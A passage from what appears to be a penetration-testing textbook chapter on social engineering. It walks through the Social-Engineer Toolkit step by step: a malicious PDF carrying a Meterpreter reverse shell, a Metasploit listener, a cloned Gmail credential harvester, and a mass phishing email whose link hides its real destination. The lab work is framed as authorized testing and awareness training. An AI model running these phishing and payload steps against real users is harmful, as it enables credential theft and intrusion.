<html><head></head><body><section class="chapter" epub:type="chapter" id="social_engineering" title="Chapter&#xA0;11.&#xA0;Social Engineering"><div class="titlepage"><div><div><h2 class="title">Chapter 11. Social Engineering</h2></div></div></div><p><a class="indexterm" id="iddle1729"/><a class="indexterm" id="iddle2188"/><a class="indexterm" id="iddle2349"/>It is a common saying in information security that users are the vulnerability that can never be patched. Put all the security controls in place that you want, but if an employee can be convinced to give up sensitive company information, it is all for naught. In fact, many of the most famous hacks include no system exploitation at all.</p><p>For example, consider notorious hacker Kevin Mitnick. Many of Mitnick’s most famous exploits came down to walking into a building, convincing the security guard he had permission to be there, and then walking out with what he wanted. This kind of attack, called <span class="emphasis"><em>social engineering</em></span>, exploits human vulnerabilities: a desire to be helpful, unawareness of security policies, and so on.</p><p><a class="indexterm" id="iddle1325"/><a class="indexterm" id="iddle1932"/><a class="indexterm" id="iddle2136"/><a class="indexterm" id="iddle2186"/><a class="indexterm" id="iddle2314"/><a class="indexterm" id="iddle2319"/>Social-engineering attacks can involve complex technical requirements or no technology at all. A social engineer can buy a cable guy uniform at the thrift store and potentially walk into an organization, and even into the server room. The IT help desk can receive a frantic call from the boss’s boss’s assistant, who claims to have locked himself out of his webmail account. People generally want to be helpful, so unless there is a secure policy in place, the help desk worker may read back the password over the phone or set it to a default value, even though the caller is not who he says he is.</p><p>A common vector for social-engineering attacks is email. If you are ever short on entertainment at work, check out your email spam folder. Among the advertisements to make some things bigger and others smaller, you will find people trying desperately to give you all their money. I firmly believe that if you can find the one African prince who really does want to give you his fortune, it will be worth all those times your bank account got hacked from answering phishing emails. Joking aside, attempting to trick a user into giving up sensitive information by posing as a trusted person via email or other electronic means is known as a <span class="emphasis"><em>phishing attack</em></span>. Phishing emails can be used to lure targets to visit malicious sites or download malicious attachments, among other things. Social-engineering attacks are the missing element needed to trick users into falling victim to the client-side attacks we studied in <a class="xref" href="ch10.xhtml" title="Chapter 10. Client-Side Exploitation">Chapter 10</a>.</p><p>Companies should put time and effort into training all employees about social-engineering attacks. No matter what sort of security technologies you put in place, employees have to be able to use their workstations, their mobile devices, and so on to get their job done. They will have access to sensitive information or security controls that, in the wrong hands, could harm the organization. Some security-awareness training may seem obvious, like “Don’t share your password with anyone” and “Check someone’s badge before you hold the door to a secure area for him or her.” Other security awareness may be new to many employees. For instance, on some pentesting engagements, I’ve had great success leaving USB sticks in the parking lot or DVDs labeled “Payroll” on the bathroom floor. Curious users start plugging these in, opening files, and giving me access to their systems. Security-awareness training about malicious files, USB switchblades, and other attacks can help stop users from falling victim to these types of social-engineering attacks.</p><div class="sect1" title="The Social-Engineer Toolkit"><div class="titlepage"><div><div><h2 class="title" id="social-engineer_toolkit" style="clear: both">The Social-Engineer Toolkit</h2></div></div></div><p>TrustedSec’s Social-Engineer Toolkit (SET), an open source Python-driven tool, is designed to help you perform social-engineering attacks during pentests. SET will help you create a variety of attacks such as email phishing campaigns (designed to steal credentials, financial information, and so on using specially targeted email) and web-based attacks (such as cloning a client website and tricking users into entering their login credentials).</p><p><a class="indexterm" id="iddle2137"/><a class="indexterm" id="iddle2139"/><a class="indexterm" id="iddle2187"/><a class="indexterm" id="iddle2200"/>SET comes preinstalled in Kali Linux. To start SET in Kali Linux, enter <span class="strong"><strong><code class="literal">setoolkit</code></strong></span> at a prompt, as shown in <a class="xref" href="ch11.xhtml#starting_set" title="Example 11-1. Starting SET">Example 11-1</a>. We’ll use SET to run social-engineering attacks, so enter a <span class="strong"><strong><code class="literal">1</code></strong></span> at the prompt to move to the Social-Engineering Attacks menu. You will be prompted to accept the terms of service.</p><div class="example"><a id="starting_set"/><div class="example-title">Example 11-1. Starting SET</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>setoolkit</strong></span>&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
 Select from the menu:&#13;
&#13;
   1) Social-Engineering Attacks&#13;
   2) Fast-Track Penetration Testing&#13;
   3) Third Party Modules&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
  99) Exit the Social-Engineer Toolkit&#13;
&#13;
set&gt; <span class="strong"><strong>1</strong></span></pre></div></div><p>In this chapter we’ll look at just a few of the SET attacks that I use regularly on pentesting engagements. We’ll begin with spear-phishing attacks, which allow us to deliver attacks via email.</p></div><div class="sect1" title="Spear-Phishing Attacks"><div class="titlepage"><div><div><h2 class="title" id="spear-phishing_attacks" style="clear: both">Spear-Phishing Attacks</h2></div></div></div><p>The Social-Engineering Attacks menu gives us several attack options, as shown in <a class="xref" href="ch11.xhtml#choose_spear-phishing_attack_vectors" title="Example 11-2. Choose Spear-Phishing Attack Vectors">Example 11-2</a>. We’ll create a spear-phishing attack, which will allow us to create malicious files for client-side attacks (like the ones covered in <a class="xref" href="ch10.xhtml" title="Chapter 10. Client-Side Exploitation">Chapter 10</a>), email them, and automatically set up a Metasploit handler to catch the payload.</p><div class="example"><a id="choose_spear-phishing_attack_vectors"/><div class="example-title">Example 11-2. Choose <code class="literal">Spear-Phishing Attack Vectors</code></div><div class="example-contents"><pre class="programlisting">Select from the menu:&#13;
&#13;
   1) Spear-Phishing Attack Vectors ❶&#13;
   2) Website Attack Vectors&#13;
   3) Infectious Media Generator&#13;
   4) Create a Payload and Listener&#13;
   5) Mass Mailer Attack&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
  99) Return back to the main menu.&#13;
&#13;
set&gt; <span class="strong"><strong>1</strong></span></pre></div></div><p>Select option <span class="strong"><strong><code class="literal">1</code></strong></span> to choose <code class="literal">Spear-Phishing Attack Vectors</code> ❶. The Spear-Phishing Attack Vectors menu is shown in <a class="xref" href="ch11.xhtml#choose_perform_a_mass_email_attack" title="Example 11-3. Choose Perform a Mass Email Attack">Example 11-3</a>.</p><div class="example"><a id="choose_perform_a_mass_email_attack"/><div class="example-title">Example 11-3. Choose <code class="literal">Perform a Mass Email Attack</code></div><div class="example-contents"><pre class="programlisting">   1) Perform a Mass Email Attack ❶&#13;
   2) Create a FileFormat Payload ❷&#13;
   3) Create a Social-Engineering Template ❸&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
  99) Return to Main Menu&#13;
&#13;
set:phishing&gt; <span class="strong"><strong>1</strong></span></pre></div></div><p><a class="indexterm" id="iddle2201"/>The first option, <code class="literal">Perform a Mass Email Attack</code> ❶, allows us to send a malicious file to a predefined email address or list of addresses as well as set up a Metasploit listener for the selected payload. The second option, <code class="literal">Create a Fi</code><code class="literal">leFormat Payload</code> ❷, lets us create a malicious file with a Metasploit payload. The third option allows us to create a new email template ❸ to be used in SET attacks.</p><p>Choose option <span class="strong"><strong><code class="literal">1</code></strong></span> to create an email attack. (We’ll have the option to send a single email or mass email later.)</p><div class="sect2" title="Choosing a Payload"><div class="titlepage"><div><div><h3 class="title" id="choosing_a_payload-id00029">Choosing a Payload</h3></div></div></div><p>Now to choose a payload. A selection of payload options is shown in <a class="xref" href="ch11.xhtml#choose_a_spear-phishing_attack" title="Example 11-4. Choose a spear-phishing attack">Example 11-4</a>.</p><div class="example"><a id="choose_a_spear-phishing_attack"/><div class="example-title">Example 11-4. Choose a spear-phishing attack</div><div class="example-contents"><pre class="programlisting">           ********** PAYLOADS **********&#13;
&#13;
   1) SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
  12) Adobe util.printf() Buffer Overflow ❶&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
  20) MSCOMCTL ActiveX Buffer Overflow (ms12-027)&#13;
&#13;
set:payloads&gt; <span class="strong"><strong>12</strong></span></pre></div></div><p>For example, to re-create our PDF attack from <a class="xref" href="ch10.xhtml" title="Chapter 10. Client-Side Exploitation">Chapter 10</a>, choose option <span class="strong"><strong><code class="literal">12</code></strong></span>: <code class="literal">Adobe util.printf() Buffer Overflow</code> ❶. (SET includes many Metasploit attacks, as well as its own, specific attacks.)</p><p>You should be prompted to choose a payload for your malicious file (see <a class="xref" href="ch11.xhtml#choose_a_payload" title="Example 11-5. Choose a payload">Example 11-5</a>).</p><div class="example"><a id="choose_a_payload"/><div class="example-title">Example 11-5. Choose a payload</div><div class="example-contents"><pre class="programlisting">1) Windows Reverse TCP Shell              Spawn a command shell on victim and&#13;
                                            send back to attacker&#13;
2) Windows Meterpreter Reverse_TCP        Spawn a meterpreter shell on victim&#13;
                                            and send back to attacker ❶&#13;
&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
&#13;
set:payloads&gt; <span class="strong"><strong>2</strong></span></pre></div></div><p><a class="indexterm" id="iddle2203"/><a class="indexterm" id="iddle2204"/><a class="indexterm" id="iddle2206"/><a class="indexterm" id="iddle2493"/>The usual suspects are all here, including <span class="emphasis"><em>windows/meterpreter/reverse_tcp</em></span>, which appears in a more human-readable form as <code class="literal">Windows Meterpreter Reverse_TCP</code> ❶. We’ll choose this option for our sample attack.</p></div><div class="sect2" title="Setting Options"><div class="titlepage"><div><div><h3 class="title" id="setting_options-id00030">Setting Options</h3></div></div></div><p>SET should prompt for the relevant options for the payload, in this case the <code class="literal">LHOST</code> and <code class="literal">LPORT</code>. If you’re not very familiar with Metasploit, just answer the prompts to set the correct options automatically, as shown in <a class="xref" href="ch11.xhtml#setting_options-id00031" title="Example 11-6. Setting options">Example 11-6</a>. Set the payload listener to the IP address of Kali Linux. Leave the port to connect back on to the default (443).</p><div class="example"><a id="setting_options-id00031"/><div class="example-title">Example 11-6. Setting options</div><div class="example-contents"><pre class="programlisting">set&gt; IP address for the payload listener: <span class="strong"><strong>192.168.20.9</strong></span>&#13;
set:payloads&gt; Port to connect back on [443]:&#13;
[-] Defaulting to port 443...&#13;
[-] Generating fileformat exploit...&#13;
[*] Payload creation complete.&#13;
[*] All payloads get sent to the /usr/share/set/src/program_junk/template.pdf directory&#13;
[-] As an added bonus, use the file-format creator in SET to create your attachment.</pre></div></div></div><div class="sect2" title="Naming Your File"><div class="titlepage"><div><div><h3 class="title" id="naming_your_file">Naming Your File</h3></div></div></div><p>Next you should be prompted to name your malicious file.</p><a id="pro_id00135"/><pre class="programlisting">Right now the attachment will be imported with filename of 'template.whatever'&#13;
   Do you want to rename the file?&#13;
   example Enter the new filename: moo.pdf&#13;
    1. Keep the filename, I don't care.&#13;
    2. Rename the file, I want to be cool. ❶&#13;
&#13;
set:phishing&gt; <span class="strong"><strong>2</strong></span>&#13;
set:phishing&gt; New filename: <span class="strong"><strong>bulbsecuritysalaries.pdf</strong></span>&#13;
[*] Filename changed, moving on...</pre><p>Select option <span class="strong"><strong><code class="literal">2</code></strong></span> ❶ to rename the malicious PDF, and enter the filename <span class="emphasis"><em>bulbsecuritysalaries.pdf</em></span>. SET should continue.</p></div><div class="sect2" title="Single or Mass Email"><div class="titlepage"><div><div><h3 class="title" id="single_or_mass_email">Single or Mass Email</h3></div></div></div><p>Now to decide whether to have SET send our malicious file to a single email address or a list of addresses, as shown in <a class="xref" href="ch11.xhtml#choosing_to_perform_a_single_email_addre" title="Example 11-7. Choosing to perform a single email address attack">Example 11-7</a>.</p><div class="example"><a id="choosing_to_perform_a_single_email_addre"/><div class="example-title">Example 11-7. Choosing to perform a single email address attack</div><div class="example-contents"><pre class="programlisting">   Social Engineer Toolkit Mass E-Mailer&#13;
&#13;
   What do you want to do:&#13;
&#13;
   1.  E-Mail Attack Single Email Address ❶&#13;
   2.  E-Mail Attack Mass Mailer ❷&#13;
   99. Return to main menu.&#13;
&#13;
set:phishing&gt; <span class="strong"><strong>1</strong></span></pre></div></div><p><a class="indexterm" id="iddle1655"/><a class="indexterm" id="iddle2205"/><a class="indexterm" id="iddle2207"/>Choose the single email address option ❶ for now. (We’ll look at sending mass email ❷ in <a class="xref" href="ch11.xhtml#mass_email_attacks" title="Mass Email Attacks">Mass Email Attacks</a>.)</p></div><div class="sect2" title="Creating the Template"><div class="titlepage"><div><div><h3 class="title" id="creating_the_template">Creating the Template</h3></div></div></div><p>When crafting the email, we can use one of SET’s email templates or enter text for one-time use in the template. In addition, if you choose <code class="literal">Create a Social-Engineering Template</code>, you can create a template that you can reuse.</p><p>Many of my social engineering customers like me to use fake emails that appear to come from a company executive or the IT manager, announcing new website functionality or a new company policy. Let’s use one of SET’s email templates as an example to fake this email now, as shown in <a class="xref" href="ch11.xhtml#choosing_an_email_template" title="Example 11-8. Choosing an email template">Example 11-8</a>; we’ll create our own email later in the chapter.</p><div class="example"><a id="choosing_an_email_template"/><div class="example-title">Example 11-8. Choosing an email template</div><div class="example-contents"><pre class="programlisting">   Do you want to use a predefined template or craft a one time email template.&#13;
   1. Pre-Defined Template&#13;
   2. One-Time Use Email Template&#13;
&#13;
set:phishing&gt; <span class="strong"><strong>1</strong></span>&#13;
[-] Available templates:&#13;
1: Strange internet usage from your computer&#13;
2: Computer Issue&#13;
3: New Update&#13;
4: How long has it been&#13;
5: WOAAAA!!!!!!!!!! This is crazy...&#13;
6: Have you seen this?&#13;
7: Dan Brown's Angels &amp; Demons&#13;
8: Order Confirmation&#13;
9: Baby Pics&#13;
10: Status Report&#13;
set:phishing&gt; <span class="strong"><strong>5</strong></span></pre></div></div><p>Choose <span class="strong"><strong><code class="literal">1</code></strong></span> for <code class="literal">Pre-Defined Template</code>, then choose template <span class="strong"><strong><code class="literal">5</code></strong></span>.</p></div><div class="sect2" title="Setting the Target"><div class="titlepage"><div><div><h3 class="title" id="setting_the_target">Setting the Target</h3></div></div></div><p>Now SET should prompt you for your target email address and a mail server for use in delivering the attack email. You can use your own mail server, one <a class="indexterm" id="iddle1857"/><a class="indexterm" id="iddle2202"/>that is misconfigured to allow anyone to send mail (called an open relay), or a Gmail account, as shown in <a class="xref" href="ch11.xhtml#sending_email_with_set" title="Example 11-9. Sending email with SET">Example 11-9</a>. Let’s use Gmail for this attack by choosing option <span class="strong"><strong><code class="literal">1</code></strong></span>.</p><div class="example"><a id="sending_email_with_set"/><div class="example-title">Example 11-9. Sending email with SET</div><div class="example-contents"><pre class="programlisting">set:phishing&gt; Send email to: <span class="strong"><strong>georgia@metasploit.com</strong></span>&#13;
&#13;
  1. Use a gmail Account for your email attack.&#13;
  2. Use your own server or open relay&#13;
&#13;
set:phishing&gt; <span class="strong"><strong>1</strong></span>&#13;
set:phishing&gt; Your gmail email address: <span class="strong"><strong>georgia@bulbsecurity.com</strong></span>&#13;
set:phishing&gt; The FROM NAME user will see: <span class="strong"><strong>Georgia Weidman</strong></span>&#13;
Email password:&#13;
set:phishing&gt; Flag this message/s as high priority? [yes|no]: <span class="strong"><strong>no</strong></span>&#13;
[!] Unable to deliver email. Printing exceptions message below, this is most likely due to an illegal attachment. If using GMAIL they inspect PDFs and is most likely getting caught. ❶&#13;
[*] SET has finished delivering the emails</pre></div></div><p>When prompted, enter the email address and password for your Gmail account. SET should attempt to deliver the message. But as you can see in the message at the bottom of the listing, Gmail inspects attachments and catches our attack ❶.</p><p>That’s just a first attempt, of course. You may get better results using your own mail server or your client’s mail server, if you can gather or guess the credentials.</p><p>Of course, in this example, I’m just sending emails to myself. We looked at tools such as theHarvester to find valid email addresses to target in <a class="xref" href="ch05.xhtml" title="Chapter 5. Information Gathering">Chapter 5</a>.</p></div><div class="sect2" title="Setting Up a Listener"><div class="titlepage"><div><div><h3 class="title" id="setting_up_a_listener">Setting Up a Listener</h3></div></div></div><p>We can also have SET set up a Metasploit listener to catch our payload if anyone opens the email attachment. Even if you’re not familiar with Metasploit syntax, you should be able to use SET to set up this attack based on the options we chose in <a class="xref" href="ch04.xhtml#setting_options" title="Setting Options">Setting Options</a>. You can see that SET uses a resource file to automatically set the payload, <code class="literal">LHOST</code>, and <code class="literal">LPORT</code> options based on our previous answers when building the payload (see <a class="xref" href="ch11.xhtml#setting_up_a_listener-id00032" title="Example 11-10. Setting up a listener">Example 11-10</a>).</p><div class="example"><a id="setting_up_a_listener-id00032"/><div class="example-title">Example 11-10. Setting up a listener</div><div class="example-contents"><pre class="programlisting">set:phishing&gt; Setup a listener [yes|no]: <span class="strong"><strong>yes</strong></span>&#13;
Easy phishing: Set up email templates, landing pages and listeners&#13;
in Metasploit Pro's wizard -- type 'go_pro' to launch it now.&#13;
&#13;
       =[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0]&#13;
+ -- --=[ 1246 exploits - 678 auxiliary - 198 post&#13;
+ -- --=[ 324 payloads - 32 encoders - 8 nops&#13;
&#13;
[*] Processing src/program_junk/meta_config for ERB directives.&#13;
resource (src/program_junk/meta_config)&gt; use exploit/multi/handler&#13;
resource (src/program_junk/meta_config)&gt; set PAYLOAD windows/meterpreter/reverse_tcp&#13;
PAYLOAD =&gt; windows/meterpreter/reverse_tcp&#13;
resource (src/program_junk/meta_config)&gt; set LHOST 192.168.20.9&#13;
LHOST =&gt; 192.168.20.9&#13;
resource (src/program_junk/meta_config)&gt; set LPORT 443&#13;
LPORT =&gt; 443&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
resource (src/program_junk/meta_config)&gt; exploit -j&#13;
[*] Exploit running as background job.&#13;
msf  exploit(handler) &gt;&#13;
[*] Started reverse handler on 192.168.20.9:443&#13;
[*] Starting the payload handler...</pre></div></div><p><a class="indexterm" id="iddle1574"/><a class="indexterm" id="iddle1708"/><a class="indexterm" id="iddle2192"/>Now we wait for a curious user to open our malicious PDF and send us a session. Use <span class="smaller">ctrl</span>-C to close the listener and type <code class="literal">exit</code> to move back to the previous menu. Option 99 will take you back to SET’s Social-Engineering Attacks menu.</p></div></div><div class="sect1" title="Web Attacks"><div class="titlepage"><div><div><h2 class="title" id="web_attacks" style="clear: both">Web Attacks</h2></div></div></div><p>In this section we’ll look at web-based attacks. Return to the Social-Engineering Attacks menu (<a class="xref" href="ch11.xhtml#choose_spear-phishing_attack_vectors" title="Example 11-2. Choose Spear-Phishing Attack Vectors">Example 11-2</a>), and choose option <span class="strong"><strong><code class="literal">2</code></strong></span> (<code class="literal">Website Attack Vectors</code>). This is the sort of attack that I use most often in pentests that have a social-engineering component because it emulates many social-engineering attacks seen in the wild.</p><p>You should be presented with a list of web-based attacks as shown in <a class="xref" href="ch11.xhtml#set_website_attacks" title="Example 11-11. SET website attacks">Example 11-11</a>.</p><div class="example"><a id="set_website_attacks"/><div class="example-title">Example 11-11. SET website attacks</div><div class="example-contents"><pre class="programlisting">   1) Java Applet Attack Method&#13;
   2) Metasploit Browser Exploit Method&#13;
   3) Credential Harvester Attack Method&#13;
   4) Tabnabbing Attack Method&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
  99) Return to Main Menu&#13;
&#13;
set:webattack&gt; <span class="strong"><strong>3</strong></span></pre></div></div><p>Here’s a description of some of the attacks:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>The Java Applet Attack Method automates the Java-signed applet attack we used in <a class="xref" href="ch10.xhtml" title="Chapter 10. Client-Side Exploitation">Chapter 10</a>.</p></li><li class="listitem"><p>The Metasploit Browser Exploit Method allows you to use all of Metasploit’s browser-exploitation client-side attacks without having to set parameters manually, by knowing Metasploit syntax.</p></li><li class="listitem"><p><a class="indexterm" id="iddle1219"/><a class="indexterm" id="iddle2278"/>The Credential Harvester Attack Method helps create websites to trick users into giving up their credentials.</p></li><li class="listitem"><p>The Tabnabbing Attack Method relies on users’ propensity to build up a collection of open browser tabs. When the user first opens the attack page, it says “Please wait.” Naturally, the user switches back to another tab while he waits. Once the attack tab is no longer in focus, it loads the attack site (which can be a clone of any website you like), with the goal of tricking the user into supplying his credentials or otherwise interacting with the malicious site. The assumption is that the user will use the first tab he encounters that looks legitimate.</p></li></ul></div><p>Choose option <span class="strong"><strong><code class="literal">3</code></strong></span>, the <code class="literal">Credential Harvester Attack Method</code>.</p><p>Next you should see a prompt asking what sort of website you would like. We can choose from some prebuilt web templates, clone a website from the Internet with Site Cloner, or import a custom web page with Custom Import. Choose option <span class="strong"><strong><code class="literal">1</code></strong></span> to use a SET template (see <a class="xref" href="ch11.xhtml#set_website_template_options" title="Example 11-12. SET website template options">Example 11-12</a>).</p><div class="example"><a id="set_website_template_options"/><div class="example-title">Example 11-12. SET website template options</div><div class="example-contents"><pre class="programlisting">   1) Web Templates&#13;
   2) Site Cloner&#13;
   3) Custom Import&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
  99) Return to Webattack Menu&#13;
&#13;
set:webattack&gt; <span class="strong"><strong>1</strong></span></pre></div></div><p>Now enter the IP address for the website to post credentials back to. We can just use the local IP address for the Kali virtual machine, but if you use this attack against a client, you will need an Internet-facing IP address.</p><a id="pro_id00136"/><pre class="programlisting">IP Address for the POST back in Harvester: <span class="strong"><strong>192.168.20.9</strong></span></pre><p>Now choose a template. Because we want to trick users into entering their credentials, choose a template with a login field, such as Gmail (option <span class="strong"><strong><code class="literal">2</code></strong></span>), as shown in <a class="xref" href="ch11.xhtml#setting_up_the_site" title="Example 11-13. Setting up the site">Example 11-13</a>. SET should now start a web server with our fake Gmail page, a clone of the actual Gmail page.</p><div class="example"><a id="setting_up_the_site"/><div class="example-title">Example 11-13. Setting up the site</div><div class="example-contents"><pre class="programlisting">  1. Java Required&#13;
  2. Gmail&#13;
  3. Google&#13;
  4. Facebook&#13;
  5. Twitter&#13;
  6. Yahoo&#13;
&#13;
set:webattack&gt; Select a template: <span class="strong"><strong>2</strong></span>&#13;
&#13;
[*] Cloning the website: https://gmail.com&#13;
[*] This could take a little bit...&#13;
The best way to use this attack is if the username and password form fields are available. Regardless, this captures all POSTs on a website.&#13;
[*] The Social-Engineer Toolkit Credential Harvester Attack&#13;
[*] Credential Harvester is running on port 80&#13;
[*] Information will be displayed to you as it arrives below:</pre></div></div><p>Now browse to the cloned Gmail site at the Kali Linux web server and enter some credentials to see how this works. After entering credentials you should be redirected to the real Gmail site. To a user it will just seem like he typed in his password incorrectly. In the meantime, back in SET, you should see a result that looks something like <a class="xref" href="ch11.xhtml#set_capturing_credentials" title="Example 11-14. SET capturing credentials">Example 11-14</a>.</p><div class="example"><a id="set_capturing_credentials"/><div class="example-title">Example 11-14. SET capturing credentials</div><div class="example-contents"><pre class="programlisting">192.168.20.10 - - [10/May/2015 12:58:02] "GET / HTTP/1.1" 200 -&#13;
[*] WE GOT A HIT! Printing the output:&#13;
PARAM: ltmpl=default&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
PARAM: GALX=oXwT1jDgpqg&#13;
POSSIBLE USERNAME FIELD FOUND: Email=georgia❶&#13;
POSSIBLE PASSWORD FIELD FOUND: Passwd=password❷&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
PARAM: asts=&#13;
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.</pre></div></div><p>When the user submits the page, SET highlights the fields that it thinks are interesting. In this case, it found the Email ❶ and Passwd ❷ that were submitted. Once you shut down the web server with <span class="smaller">ctrl</span>-C to end the web attack, the results should be written to a file.</p><p>When combined with the email attack discussed next, this is a great attack to use to gather credentials for a pentest or, at the very least, test the security awareness of your client’s employees.</p><p>Note that this attack can be even more interesting if you use option <span class="strong"><strong><code class="literal">5</code></strong></span>, <code class="literal">Site Cloner</code>, to make a copy of your customer’s site. If they do not have a page with a login form of some sort (VPN, webmail, blogging, and so on) you can even create one. Clone their site, and add a simple HTML form like this:</p><a id="pro_id00137"/><pre class="programlisting">&lt;form name="input" action="index.html" method="post"&gt;&#13;
Username: &lt;input type="text" name="username"&gt;&lt;br&gt;&#13;
Password: &lt;input type="password" name="pwd"&gt;&lt;br&gt;&#13;
&lt;input type="submit" value="Submit"&gt;&lt;br&gt;&#13;
&lt;/form&gt;</pre><p>Then use option <span class="strong"><strong><code class="literal">3</code></strong></span>, <code class="literal">Custom Import</code>, to have SET serve your modified page.</p></div><div class="sect1" title="Mass Email Attacks"><div class="titlepage"><div><div><h2 class="title" id="mass_email_attacks" style="clear: both">Mass Email Attacks</h2></div></div></div><p><a class="indexterm" id="iddle1670"/><a class="indexterm" id="iddle1933"/><a class="indexterm" id="iddle2189"/>Now to use SET to automate phishing email attacks. Create a file and enter a few email addresses, one per line, as shown here.</p><a id="pro_id00138"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>cat emails.txt</strong></span>&#13;
<span class="strong"><strong>georgia@bulbsecurity.com</strong></span>&#13;
<span class="strong"><strong>georgia@grmn00bs.com</strong></span>&#13;
<span class="strong"><strong>georgia@metasploit.com</strong></span></pre><p>Now return to the main SET Social-Engineering Attacks menu with option 99 (<a class="xref" href="ch11.xhtml#setting_up_an_email_attack" title="Example 11-15. Setting up an email attack">Example 11-15</a>) and choose option <span class="strong"><strong><code class="literal">5</code></strong></span>, <code class="literal">Mass Mailer Attack</code>. Large carbon copy or blind carbon copy lists can trigger spam filters or tip off users that something is amiss, and emailing a long list of client employees individually by hand can be tedious, so we’ll use SET to email multiple addresses (see <a class="xref" href="ch11.xhtml#setting_up_an_email_attack" title="Example 11-15. Setting up an email attack">Example 11-15</a>). Scripts are good for repetitive tasks like this.</p><div class="example"><a id="setting_up_an_email_attack"/><div class="example-title">Example 11-15. Setting up an email attack</div><div class="example-contents"><pre class="programlisting">set&gt; <span class="strong"><strong>5</strong></span>&#13;
&#13;
    1.  E-Mail Attack Single Email Address&#13;
    2.  E-Mail Attack Mass Mailer&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
    99. Return to main menu.&#13;
&#13;
set:mailer&gt; <span class="strong"><strong>2</strong></span>&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
set:phishing&gt; Path to the file to import into SET: <span class="strong"><strong>/root/emails.txt</strong></span>❶</pre></div></div><p>Choose option <span class="strong"><strong><code class="literal">2</code></strong></span> and enter the name of the email address file to import ❶.</p><p>Next we need to choose a server (see <a class="xref" href="ch11.xhtml#logging_in_to_gmail" title="Example 11-16. Logging in to Gmail">Example 11-16</a>). Let’s use Gmail again—option <span class="strong"><strong><code class="literal">1</code></strong></span>. When prompted, enter your credentials.</p><div class="example"><a id="logging_in_to_gmail"/><div class="example-title">Example 11-16. Logging in to Gmail</div><div class="example-contents"><pre class="programlisting">1. Use a gmail Account for your email attack.&#13;
2. Use your own server or open relay&#13;
&#13;
set:phishing&gt; <span class="strong"><strong>1</strong></span>&#13;
set:phishing&gt; Your gmail email address: <span class="strong"><strong>georgia@bulbsecurity.com</strong></span>&#13;
set:phishing&gt; The FROM NAME the user will see: <span class="strong"><strong>Georgia Weidman</strong></span>&#13;
Email password:&#13;
set:phishing&gt; Flag this message/s as high priority? [yes|no]: <span class="strong"><strong>no</strong></span></pre></div></div><p>You should be asked to create the email to send, as shown in <a class="xref" href="ch11.xhtml#sending_the_email" title="Example 11-17. Sending the email">Example 11-17</a>.</p><div class="example"><a id="sending_the_email"/><div class="example-title">Example 11-17. Sending the email</div><div class="example-contents"><pre class="programlisting">set:phishing&gt; Email subject: <span class="strong"><strong>Company Web Portal</strong></span>&#13;
set:phishing&gt; Send the message as html or plain? 'h' or 'p': <span class="strong"><strong>h</strong></span>❶&#13;
[!] IMPORTANT: When finished, type END (all capital) then hit {return} on a new line.&#13;
set:phishing&gt; Enter the body of the message, type END (capitals) when finished: <span class="strong"><strong>All</strong></span>&#13;
Next line of the body:&#13;
Next line of the body: <span class="strong"><strong>We are adding a new company web portal. Please go to &lt;a href= "192.168.20.9"&gt;http://www.bulbsecurity.com/webportal&lt;/a&gt; and use your Windows domain credentials to log in.</strong></span>&#13;
Next line of the body:&#13;
Next line of the body: <span class="strong"><strong>Bulb Security Administrator</strong></span>&#13;
Next line of the body: <span class="strong"><strong>END</strong></span>&#13;
[*] Sent e-mail number: 1 to address: georgia@bulbsecurity.com&#13;
[*] Sent e-mail number: 2 to address: georgia@grmn00bs.com&#13;
[*] Sent e-mail number: 3 to address: georgia@metasploit.com&#13;
[*] Sent e-mail number: 4 to address:&#13;
[*] SET has finished sending the emails&#13;
      Press &lt;return&gt; to continue</pre></div></div><p><a class="indexterm" id="iddle1481"/>When asked whether to make the email plaintext or HTML, choose <span class="strong"><strong><code class="literal">h</code></strong></span> for HTML ❶. By using HTML for the email, we’ll be better able to hide the real destination of the links in the email behind graphics and such.</p><p>Now to enter the text for the email. Because we chose HTML as the email format, we can use HTML tags in our email. For example, this code creates a link for the recipient to click: <code class="literal">&lt;a href="192.168.20.9"&gt;http://www.bulbsecurity.com/webportal&lt;/a&gt;</code>. The text displayed indicates that the link goes to <span class="emphasis"><em><a class="ulink" href="http://www.bulbsecurity.com/webportal" target="_top">http://www.bulbsecurity.com/webportal</a></em></span>, but the link will really open 192.168.20.9 in the browser. We control the website at 192.168.20.9, so we can put a browser exploit or a phishing attack there. Add some text to the email to convince users to click the included link. This is where you can be particularly creative. For example, in <a class="xref" href="ch11.xhtml#sending_the_email" title="Example 11-17. Sending the email">Example 11-17</a>, we inform the users that a new company portal has been added, and they should log in with their domain credentials to check it out. On a pentest, a better way to approach this would be to register a variation of the company’s domain name (bulb-security.com) or perhaps use a slight misspelling (bulbsecurty.com) that is likely to go unnoticed by users and host your social-engineering site there.</p><p>After you finish the email, press <span class="smaller">ctrl-C</span> to send it. The email will be sent to each address in the <span class="emphasis"><em>emails.txt</em></span> file we entered earlier.</p><p>Recipients will see this email:</p><div class="blockquote"><blockquote class="blockquote"><p>All,</p><p>We are adding a new company web portal. Please go to <span class="emphasis"><em><a class="ulink" href="http://www.bulbsecurity.com/webportal" target="_top">http://www.bulbsecurity.com/webportal</a></em></span> and use your Windows domain credentials to log in.</p><p>Bulb Security Administrator</p></blockquote></div><p>While a security-savvy user should know better than to click links in emails that are not from a trusted source, and would know how to verify where a link points to before clicking it, not all users are that savvy, and even the savvy ones aren’t always paying attention. In fact, I have never launched a social-engineering test that failed.</p></div><div class="sect1" title="Multipronged Attacks"><div class="titlepage"><div><div><h2 class="title" id="multipronged_attacks" style="clear: both">Multipronged 